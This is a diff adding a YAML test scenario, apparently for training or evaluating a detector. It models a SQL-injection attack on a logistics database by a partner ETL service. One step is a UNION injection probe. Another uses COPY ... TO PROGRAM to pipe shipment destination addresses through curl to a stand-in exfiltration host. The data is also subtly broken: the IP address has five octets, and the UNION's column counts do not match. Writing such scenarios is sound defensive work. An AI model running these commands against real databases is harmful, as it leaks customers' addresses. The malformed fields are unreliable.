@@ -1,0 +1,24 @@
+scenario_id: gen_logistics_11_sql_injection_mal_256
+family_id: gen_logistics_11_sql_injection_mal_fam256
+domain: logistics
+time_of_day: 02:20
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: inject
+  role: partner_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 3.0
+  events:
+  - step_id: probe
+    sql: SELECT warehouse_id, name FROM warehouses WHERE shipment_id = 0 UNION SELECT
+      dest_address FROM shipments
+  - step_id: exfil
+    sql: COPY (SELECT dest_address FROM shipments) TO PROGRAM 'curl -sX POST https://analytics-mirror.datasink.example/ingest
+      -d @-'
+    connects_to:
+      ip: 176.65.48.175.160
+      port: 8080
